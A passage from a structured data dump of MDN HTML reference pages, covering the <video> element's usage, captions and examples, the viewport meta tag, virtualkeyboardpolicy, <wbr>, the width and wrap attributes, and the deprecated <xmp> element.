Playback has stopped because of a temporary lack of data.                                                                                                                                                                                         |\n\n## Usage notes\n\nBrowsers don't all support the same video formats; you can provide multiple sources inside nested [`<source>`](source) elements, and the browser will then use the first one it understands.\n\nhtml\n\n```\n<video controls>\n  <source src=\"myVideo.webm\" type=\"video/webm\" />\n  <source src=\"myVideo.mp4\" type=\"video/mp4\" />\n  <p>\n    Your browser doesn't support HTML video. Here is a\n    <a href=\"myVideo.mp4\" download=\"myVideo.mp4\">link to the video</a> instead.\n  </p>\n</video>\n```\n\nWe offer a substantive and thorough [guide to media file types](https://developer.mozilla.org/en-US/docs/Web/Media/Formats) and the [guide to the codecs supported for video](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Video_codecs). Also available is a guide to [audio codecs that can be used with them](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Audio_codecs).\n\nOther usage notes:\n\n- If you don't specify the `controls` attribute, the video won't include the browser's default controls; you can create your own custom controls using JavaScript and the [`HTMLMediaElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) API. See [Creating a cross-browser video player](https://developer.mozilla.org/en-US/docs/Web/Media/Audio_and_video_delivery/cross_browser_video_player) for more details.\n- To allow precise control over your video (and audio) content, `HTMLMediaElement`s fire many different [events](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement#events). In addition to providing controllability, these events let you monitor the progress of both download and playback of the media, as well as the playback state and position.\n- You can use the [`object-position`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-position) property to adjust the positioning of the video within the element's frame, and the [`object-fit`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit) property to control how the video's size is adjusted to fit within the frame.\n- To show subtitles/captions along with your video, you can use some JavaScript along with the [`<track>`](track) element and the [WebVTT](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API) format. See [Adding captions and subtitles to HTML video](https://developer.mozilla.org/en-US/docs/Web/Media/Audio_and_video_delivery/Adding_captions_and_subtitles_to_HTML5_video) for more information.\n- You can play audio files using a `<video>` element. This can be useful if, for example, you need to perform audio with a [WebVTT](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API) transcript, since the [`<audio>`](audio) element doesn't allow captions using WebVTT.\n- To test the fallback content on browsers that support the element, you can replace `<video>` with a non-existing element like `<notavideo>`.\n\nA good general source of information on using HTML `<video>` is the [Video and audio content](https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Video_and_audio_content) beginner's tutorial.\n\n### Styling with CSS\n\nThe `<video>` element is a replaced element — its [`display`](https://developer.mozilla.org/en-US/docs/Web/CSS/display) value is `inline` by default — but its default width and height in the viewport is defined by the video being embedded.\n\nThere are no special considerations for styling `<video>`; a common strategy is to give it a `display` value of `block` to make it easier to position, size, etc., and then provide styling and layout information as required. [Video player styling basics](https://developer.mozilla.org/en-US/docs/Web/Media/Audio_and_video_delivery/Video_player_styling_basics) provides some useful styling techniques.\n\n### Adding subtitles and other timed text tracks\n\nTimed text tracks for subtitles, closed captions, chapter headings, and so on, can be added declaratively by nesting the [`<track>`](track) element. The tracks are specified in [Web Video Text Tracks File Format (WebVTT)](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API/Web_Video_Text_Tracks_Format) (`.vtt` files).\n\nFor example, the HTML below includes the file \"captions.vtt\", which will be used to overlay closed captions on the video if captions are enabled by the user.\n\nhtml\n\n```\n<video controls src=\"video.webm\">\n  <track default kind=\"captions\" src=\"captions.vtt\" />\n</video>\n```\n\nTimed text tracks can also be added programmatically using the [WebVTT API](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API).\n\n### Detecting track addition and removal\n\nYou can detect when tracks are added to and removed from a `<video>` element using the [`addtrack`](https://developer.mozilla.org/en-US/docs/Web/API/VideoTrackList/addtrack_event) and [`removetrack`](https://developer.mozilla.org/en-US/docs/Web/API/VideoTrackList/removetrack_event) events. However, these events aren't sent directly to the `<video>` element itself. Instead, they're sent to the track list object within the `<video>` element's [`HTMLMediaElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) that corresponds to the type of track that was added to the element:\n\n[`HTMLMediaElement.audioTracks`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/audioTracks)  \nAn [`AudioTrackList`](https://developer.mozilla.org/en-US/docs/Web/API/AudioTrackList) containing all of the media element's audio tracks. Add a listener for `addtrack` to this object to be notified when new audio tracks are added to the element.\n\n[`HTMLMediaElement.videoTracks`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/videoTracks)  \nA [`VideoTrackList`](https://developer.mozilla.org/en-US/docs/Web/API/VideoTrackList) containing all of the media element's video tracks. Add an `addtrack` listener to this object to be notified when video tracks are added to the element.\n\n[`HTMLMediaElement.textTracks`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/textTracks)  \nA [`TextTrackList`](https://developer.mozilla.org/en-US/docs/Web/API/TextTrackList) containing all of the media element's text tracks (which are used for subtitles, closed captions, and so on). Add an `addtrack` listener to this object to be notified when text tracks are added to the element.\n\nFor example, to detect when audio tracks are added to or removed from a `<video>` element, you can use code like this:\n\njs\n\n```\nconst elem = document.querySelector(\"video\");\n\nelem.audioTracks.onaddtrack = (event) => {\n  trackEditor.addTrack(event.track);\n};\n\nelem.audioTracks.onremovetrack = (event) => {\n  trackEditor.removeTrack(event.track);\n};\n```\n\nThis code watches for audio tracks to be added to and removed from the element, and calls a hypothetical function on a track editor to register and remove the track from the editor's list of available tracks.\n\nYou can also use [`addEventListener()`](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener) to listen for the [`addtrack`](https://developer.mozilla.org/en-US/docs/Web/API/VideoTrackList/addtrack_event) and [`removetrack`](https://developer.mozilla.org/en-US/docs/Web/API/VideoTrackList/removetrack_event) events.\n\n### Server support for video\n\nIf the MIME type for the video is not set correctly on the server, the video may not show or show a gray box containing an X (if JavaScript is enabled).\n\nIf you use Apache Web Server to serve WebM videos, you can fix this problem by adding the video file type extensions to the `video/webm` MIME type (the most common WebM file extension is `.webm`). To do this, edit the `mime.types` file in `/etc/apache` or use the `AddType` configuration directive in `httpd.conf`:\n\n```\nAddType video/webm .webm\n```\n\nYour web host may provide an easy interface to MIME type configuration changes for new technologies until a global update naturally occurs.\n\n## Accessibility\n\nVideos should provide both captions and transcripts that accurately describe their content (see [Adding captions and subtitles to HTML video](https://developer.mozilla.org/en-US/docs/Web/Media/Audio_and_video_delivery/Adding_captions_and_subtitles_to_HTML5_video) for more information on how to implement these). Captions allow people who are experiencing hearing loss to understand a video's audio content as the video is being played, while transcripts allow people who need additional time to be able to review audio content at a pace and format that is comfortable for them.\n\nIt's worth noting that while you can caption audio-only media, you can only do so when playing audio in a `<video>` element since the video region of the element is used to present the captions. This is one of the special scenarios in which it's useful to play audio in a video element.\n\nIf automatic captioning services are used, it is important to review the generated content to ensure it accurately represents the source video.\n\nIn addition to spoken dialog, subtitles and transcripts should also identify music and sound effects that communicate important information. This includes emotion and tone:\n\n```\n14\n00:03:14 --> 00:03:18\n[Dramatic rock music]\n\n15\n00:03:19 --> 00:03:21\n[whispering] What's that off in the distance?\n\n16\n00:03:22 --> 00:03:24\nIt's… it's a…\n\n16 00:03:25 --> 00:03:32\n[Loud thumping]\n[Dishes clattering]\n```\n\nCaptions should not obstruct the main subject of the video. They can be positioned using [the `align` VTT cue setting](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API/Web_Video_Text_Tracks_Format#cue_settings).\n\n- [Web Video Text Tracks Format (WebVTT)](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API)\n- [WebAIM: Captions, Transcripts, and Audio Descriptions](https://webaim.org/techniques/captions/)\n- [MDN Understanding WCAG, Guideline 1.2 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Perceivable#guideline_1.2_%E2%80%94_providing_text_alternatives_for_time-based_media)\n- [Understanding Success Criterion 1.2.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/media-equiv-av-only-alt.html)\n- [Understanding Success Criterion 1.2.2 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/media-equiv-captions.html)\n\n## Examples\n\n### Single source\n\nThis example plays a video when activated, providing the user with the browser's default video controls to control playback.\n\n#### HTML\n\nhtml\n\n```\n<!-- Simple video example -->\n<!-- 'Big Buck Bunny' licensed under CC 3.0 by the Blender foundation. Hosted by archive.org -->\n<!-- Poster from peach.blender.org -->\n<video\n  controls\n  src=\"https://archive.org/download/BigBuckBunny_124/Content/big_buck_bunny_720p_surround.mp4\"\n  poster=\"https://peach.blender.org/wp-content/uploads/title_anouncement.jpg?x11217\"\n  width=\"620\">\n  Sorry, your browser doesn't support embedded videos, but don't worry, you can\n  <a href=\"https://archive.org/details/BigBuckBunny_124\">download it</a>\n  and watch it with your favorite video player!\n</video>\n```\n\n#### Result\n\nUntil the video starts playing, the image provided in the `poster` attribute is displayed in its place. If the browser doesn't support video playback, it displays the fallback text.\n\n### Multiple sources\n\nThis example builds on the last one, offering three different sources for the media; this allows the video to be watched regardless of which video codecs are supported by the browser.\n\n#### HTML\n\nhtml\n\n```\n<!-- Using multiple sources as fallbacks for a video tag -->\n<!-- 'Elephants Dream' by Orange Open Movie Project Studio, licensed under CC-3.0, hosted by archive.org -->\n<!-- Poster hosted by Wikimedia -->\n<video\n  width=\"620\"\n  controls\n  poster=\"https://upload.wikimedia.org/wikipedia/commons/e/e8/Elephants_Dream_s5_both.jpg\">\n  <source\n    src=\"https://archive.org/download/ElephantsDream/ed_hd.avi\"\n    type=\"video/avi\" />\n  <source\n    src=\"https://archive.org/download/ElephantsDream/ed_1024_512kb.mp4\"\n    type=\"video/mp4\" />\n\n  Sorry, your browser doesn't support embedded videos, but don't worry, you can\n  <a\n    href=\"https://archive.org/download/ElephantsDream/ed_1024_512kb.mp4\"\n    download=\"ed_1024_512kb.mp4\">\n    download the MP4\n  </a>\n  and watch it with your favorite video player!\n</video>\n```\n\n#### Result\n\nFirst AVI is tried. If that can't be played, [MP4](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Containers#mpeg-4_mp4) is tried. A fallback message is displayed if the video element isn't supported, but not if all sources fail.\n\nSome media file types let you provide more specific information using the [`codecs`](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/codecs_parameter) parameter as part of the file's type string. A relatively simple example is `video/webm; codecs=\"vp8, vorbis\"`, which says that the file is a [WebM](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Containers#webm) video using [VP8](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Video_codecs#vp8) for its video and [Vorbis](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Audio_codecs#vorbis) for audio.\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Guide to media types and formats on the web](https://developer.mozilla.org/en-US/docs/Web/Media/Formats)\n  - [Media container formats (file types)](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Containers)\n  - [Web video codec guide](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Video_codecs)\n  - [Web audio codec guide](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Audio_codecs)\n- Positioning and sizing the picture within its frame: [`object-position`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-position) and [`object-fit`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit)\n- [`<audio>`](audio)\n- [Using HTML audio and video](https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Video_and_audio_content)\n- [Manipulating video using canvas](https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Manipulating_video_using_canvas)\n- [Configuring servers for Ogg media](https://developer.mozilla.org/en-US/docs/Web/HTTP/Configuring_servers_for_Ogg_media)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/video](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/video)"
- name: Viewport meta tag
  summary: This article describes how to use the "viewport" <meta> tag to control the viewport's size and shape
  description: "# Viewport meta tag\n\nThis article describes how to use the \"viewport\" `<meta>` tag to control the viewport's size and shape.\n\n## Background\n\nThe browser's [viewport](https://developer.mozilla.org/en-US/docs/Glossary/Viewport) is the area of the window in which web content can be seen. This is often not the same size as the rendered page, in which case the browser provides scrollbars for the user to scroll around and access all the content.\n\nSome mobile devices and other narrow screens render pages in a virtual window or viewport, which is usually wider than the screen, and then shrink the rendered result down so it can all be seen at once. Users can then zoom and pan to look more closely at different areas of the page. For example, if a mobile screen has a width of 640px, pages might be rendered with a virtual viewport of 980px, and then it will be shrunk down to fit into the 640px space.\n\nThis is done because not all pages are optimized for mobile and break (or at least look bad) when rendered at a small viewport width. This virtual viewport is a way to make non-mobile-optimized sites in general look better on narrow screen devices.\n\nHowever, this mechanism is not so good for pages that are optimized for narrow screens using [media queries](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries) — if the virtual viewport is 980px for example, media queries that kick in at 640px or 480px or less will never be used, limiting the effectiveness of such responsive design techniques. The viewport `<meta>` element mitigates this problem of virtual viewport on narrow screen devices.\n\n## Viewport basics\n\nA typical mobile-optimized site contains something like the following:\n\nhtml\n\n```\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n```\n\nNot all devices are the same width; you should make sure that your pages work well in a large variation of screen sizes and orientations.\n\nThe basic attributes of the \"viewport\" `<meta>` element include:\n\n[`width`](#width)  \nControls the (minimum) size of the viewport (see [viewport width and screen width](#viewport_width_and_screen_width)). It can be set to a specific number of pixels like `width=600` or to the special value `device-width`, which is the physical size of the device screen in CSS pixels. This value establishes the value of the [`vw`](https://developer.mozilla.org/en-US/docs/Web/CSS/length#relative_length_units_based_on_viewport) unit. Minimum: `1`. Maximum: `10000`. Negative values: ignored.\n\n[`height`](#height)  \nControls the (minimum) size of the viewport (see [viewport width and screen width](#viewport_width_and_screen_width)). It can be set to a specific number of pixels like `height=400` or to the special value `device-height`, which is the physical size of the device screen in CSS pixels. This value establishes the value of the [`vh`](https://developer.mozilla.org/en-US/docs/Web/CSS/length#relative_length_units_based_on_viewport) unit. Minimum: `1`. Maximum: `10000`. Negative values: ignored.\n\n[`initial-scale`](#initial-scale)  \nControls the zoom level when the page is first loaded. Minimum: `0.1`. Maximum: `10`. Default: `1`. Negative values: ignored.\n\n[`minimum-scale`](#minimum-scale)  \nControls how much zoom out is allowed on the page. Minimum: `0.1`. Maximum: `10`. Default: `0.1`. Negative values: ignored.\n\n[`maximum-scale`](#maximum-scale)  \nControls how much zoom in is allowed on the page. Any value less than 3 fails accessibility. Minimum: `0.1`. Maximum: `10`. Default: `10`. Negative values: ignored.\n\n[`user-scalable`](#user-scalable)  \nControls whether zoom in and zoom out actions are allowed on the page. Valid values: `0`, `1`, `yes`, or `no`. Default: `1`, which is the same as `yes`. Setting the value to `0`, which is the same as `no`, is against Web Content Accessibility Guidelines (WCAG).\n\n[`interactive-widget`](#interactive-widget)  \nSpecifies the effect that interactive UI widgets, such as a virtual keyboard, have on the page's viewports. Valid values: `resizes-visual`, `resizes-content`, or `overlays-content`. Default: `resizes-visual`.\n\n**Warning:** Usage of `user-scalable=no` can cause accessibility issues to users with visual impairments such as low vision. [WCAG](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Perceivable#guideline_1.4_make_it_easier_for_users_to_see_and_hear_content_including_separating_foreground_from_background) requires a minimum of 2× scaling; however, the best practice is to enable a 5× zoom.\n\n## Screen density\n\nScreen resolutions have risen to the size that individual pixels are indistinguishable by the human eye. For example, smartphones often have small screens with resolutions upwards of 1920–1080 pixels (≈400dpi). Because of this, many browsers can display their pages in a smaller physical size by translating multiple hardware pixels for each CSS \"pixel\". Initially, this caused usability and readability problems on many touch-optimized websites.\n\nOn high dpi screens, pages with `initial-scale=1` will effectively be zoomed by browsers. Their text will be smooth and crisp, but their bitmap images may not take advantage of the full screen resolution. To get sharper images on these screens, web developers may want to design images – or whole layouts – at a higher scale than their final size and then scale them down using CSS or viewport properties.\n\nThe default pixel ratio depends on the display density. On a display with density less than 200dpi, the ratio is 1.0. On displays with density between 200 and 300dpi, the ratio is 1.5. For displays with density over 300dpi, the ratio is the integer floor (*density*/150dpi). Note that the default ratio is true only when the viewport scale equals 1. Otherwise, the relationship between CSS pixels and device pixels depends on the current zoom level.\n\n## Viewport width and screen width\n\nSites can set their viewport to a specific size. For example, the definition `\"width=320, initial-scale=1\"` can be used to fit precisely onto a small phone display in portrait mode. This can cause problems when the browser renders a page at a larger size. To fix this, browsers will expand the viewport width if necessary to fill the screen at the requested scale. This is especially useful on large-screen devices.\n\nFor pages that set an initial or maximum scale, this means the `width` property actually translates into a *minimum* viewport width. For example, if your layout needs at least 500 pixels of width then you can use the following markup. When the screen is more than 500 pixels wide, the browser will expand the viewport (rather than zoom in) to fit the screen:\n\nhtml\n\n```\n<meta name=\"viewport\" content=\"width=500, initial-scale=1\" />\n```\n\nOther [attributes](element/meta#attributes) that are available are `minimum-scale`, `maximum-scale`, and `user-scalable`. These properties affect the initial scale and width, as well as limiting changes in zoom level.\n\n## The effect of interactive UI widgets\n\nInteractive UI widgets of the browser can influence the size of the page's viewports. The most common such UI widget is a virtual keyboard. To control which resize behavior the browser should use, set the `interactive-widget` property.\n\nAllowed values are:\n\n[`resizes-visual`](#resizes-visual)  \nThe [visual viewport](https://developer.mozilla.org/en-US/docs/Glossary/Visual_Viewport) gets resized by the interactive widget.\n\n[`resizes-content`](#resizes-content)  \nThe [viewport](https://developer.mozilla.org/en-US/docs/Glossary/Viewport) gets resized by the interactive widget.\n\n[`overlays-content`](#overlays-content)  \nNeither the [viewport](https://developer.mozilla.org/en-US/docs/Glossary/Viewport) nor the [visual viewport](https://developer.mozilla.org/en-US/docs/Glossary/Visual_Viewport) gets resized by the interactive widget.\n\nWhen the [viewport](https://developer.mozilla.org/en-US/docs/Glossary/Viewport) gets resized, the initial [containing block](https://developer.mozilla.org/en-US/docs/Web/CSS/Containing_block) also gets resized, thereby affecting the computed size of [viewport units](https://developer.mozilla.org/en-US/docs/Web/CSS/length#relative_length_units_based_on_viewport).\n\n## Common viewport sizes for mobile and tablet devices\n\nIf you want to know what mobile and tablet devices have which viewport widths, there is a comprehensive list of [mobile and tablet viewport sizes here](https://experienceleague.adobe.com/en/docs/target/using/experiences/vec/mobile-viewports). This gives information such as viewport width on portrait and landscape orientation as well as physical screen size, operating system and the pixel density of the device.\n\n## Specifications\n\n[TABLE]\n\n## See also\n\n- Article: [Prepare for viewport resize behavior changes coming to Chrome on Android](https://developer.chrome.com/blog/viewport-resize-behavior/)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Viewport_meta_tag](https://developer.mozilla.org/en-US/docs/Web/HTML/Viewport_meta_tag)"
- name: virtualkeyboardpolicy (attribute)
  summary: 'Experimental: This is an experimental technologyCheck the Browser compatibility table carefully before using this in production'
  description: "# virtualkeyboardpolicy\n\n**Experimental:** **This is an [experimental technology](https://developer.mozilla.org/en-US/docs/MDN/Writing_guidelines/Experimental_deprecated_obsolete#experimental)**  \nCheck the [Browser compatibility table](#browser_compatibility) carefully before using this in production.\n\nThe `virtualkeyboardpolicy` [global attribute](../global_attributes) is an enumerated attribute. When specified on an element that the element's content is editable (for example, it is an [`<input>`](../element/input) or [`<textarea>`](../element/textarea) element, or an element with the [`contenteditable`](contenteditable) attribute set), it controls the on-screen virtual keyboard behavior on devices such as tablets, mobile phones, or other devices where a hardware keyboard may not be available.\n\nThe attribute must take one of the following values:\n\n- `auto` or an *empty string*, which automatically shows the virtual keyboard when the element is focused or tapped.\n- `manual`, which decouples focus and tap on the element from the virtual keyboard's state.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `virtualkeyboardpolicy` | 94      | 94   | No      | 80    | No     | 94             | No                  | 66            | No            | 17.0             | 94              |     |\n\n## See also\n\n- All [global attributes](../global_attributes)\n- [`HTMLElement.contentEditable`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/contentEditable) and [`HTMLElement.isContentEditable`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/isContentEditable)\n- [The VirtualKeyboard API](https://developer.mozilla.org/en-US/docs/Web/API/VirtualKeyboard_API)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/virtualkeyboardpolicy](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/virtualkeyboardpolicy)"
- name: wbr
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<wbr\\>: The Line Break Opportunity element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fwbr&level=high)\n\nThe `<wbr>` [HTML](../index) element represents a word break opportunity—a position within text where the browser may optionally break a line, though its line-breaking rules would not otherwise create a break at that location.\n\n## Try it\n\n#### HTML Demo: \\<wbr\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <div id=\"example-paragraphs\">\n      <p>Fernstraßenbauprivatfinanzierungsgesetz</p>\n      <p>Fernstraßen<wbr />bau<wbr />privat<wbr />finanzierungs<wbr />gesetz</p>\n      <p>Fernstraßen&shy;bau&shy;privat&shy;finanzierungs&shy;gesetz</p>\n    </div>\n\n    #example-paragraphs {\n      background-color: white;\n      overflow: hidden;\n      resize: horizontal;\n      width: 9rem;\n      border: 2px dashed #999;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Notes\n\nOn UTF-8 encoded pages, `<wbr>` behaves like the `U+200B ZERO-WIDTH SPACE` code point. In particular, it behaves like a Unicode bidi BN code point, meaning it has no effect on [bidi](https://developer.mozilla.org/en-US/docs/Glossary/BiDi)-ordering: `<div dir=rtl>123,<wbr>456</div>` displays, when not broken on two lines, `123,456` and not `456,123`.\n\nFor the same reason, the `<wbr>` element does not introduce a hyphen at the line break point. To make a hyphen appear only at the end of a line, use the soft hyphen character entity (`&shy;`) instead.\n\n## Examples\n\n*[The Yahoo Style Guide](https://web.archive.org/web/20121014054923/http://styleguide.yahoo.com/)* recommends [breaking a URL *before* punctuation](https://web.archive.org/web/20121105171040/http://styleguide.yahoo.com/editing/treat-abbreviations-capitalization-and-titles-consistently/website-names-and-addresses), to avoid leaving a punctuation mark at the end of the line, which the reader might mistake for the end of the URL.\n\nhtml\n\n```\n<p>\n  http://this<wbr />.is<wbr />.a<wbr />.really<wbr />.long<wbr />.example<wbr />.com/With<wbr />/deeper<wbr />/level<wbr />/pages<wbr />/deeper<wbr />/level<wbr />/pages<wbr />/deeper<wbr />/level<wbr />/pages<wbr />/deeper<wbr />/level<wbr />/pages<wbr />/deeper<wbr />/level<wbr />/pages\n</p>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                 |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content). |\n| Permitted content                           | Empty                                                                                                           |\n| Tag omission                                | Must have a start tag and must not have an end tag.                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                            |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                             |\n| Permitted ARIA roles                        | Any                                                                                                             |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                   |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `wbr` | 1       | 12   | 1       | 11.6  | 4      | 18             | 4                   | 12            | 3.2           | 1.0              | 4.4             |     |\n\n## See also\n\n- [`overflow-wrap`](https://developer.mozilla.org/en-US/docs/Web/CSS/overflow-wrap)\n- [`word-break`](https://developer.mozilla.org/en-US/docs/Web/CSS/word-break)\n- [`hyphens`](https://developer.mozilla.org/en-US/docs/Web/CSS/hyphens)\n- The [`<br>`](br) element\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/wbr](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/wbr)"
- name: width (attribute)
  summary: For the elements listed here, this establishes the element's width
  belongs_to: Attributes
  description: |-
    [`width`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/width)

    [`<canvas>`](element/canvas), [`<embed>`](element/embed), [`<iframe>`](element/iframe), [`<img>`](element/img), [`<input>`](element/input), [`<object>`](element/object), [`<video>`](element/video)

    For the elements listed here, this establishes the element's width.

    **Note:** For all other instances, such as [`<div>`](element/div), this is a legacy attribute, in which case the CSS [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width) property should be used instead.
- name: wrap (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`wrap`](element/textarea#wrap)

    [`<textarea>`](element/textarea)

    Indicates whether the text should be wrapped.
- name: xmp
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<xmp\\>\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\n## Summary\n\nThe `<xmp>` [HTML](../index) element renders text between the start and end tags without interpreting the HTML in between and using a monospaced font. The HTML2 specification recommended that it should be rendered wide enough to allow 80 characters per line.\n\n**Note:** Do not use this element.\n\n- It has been deprecated since HTML3.2 and was not implemented in a consistent way. It was completely removed from current HTML.\n- Use the [`<pre>`](pre) element or, if semantically adequate, the [`<code>`](code) element instead. Note that you will need to escape the '`<`' character as '`&lt;`' and the '`&`' character as '`&amp;`' to make sure they are not interpreted as markup.\n- A monospaced font can also be obtained on any element, by applying an adequate [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) style using `monospace` as the generic-font value for the [`font-family`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-family) property.\n\n## Attributes\n\nThis element has no other attributes than the [global attributes](../global_attributes), common to all elements.\n\n## DOM interface\n\nThis element implements the [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) interface.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- The [`<pre>`](pre) and [`<code>`](code) elements to be used instead.\n- The [`<plaintext>`](plaintext) element, similar to `<xmp>` but also obsolete.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/xmp](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/xmp)"
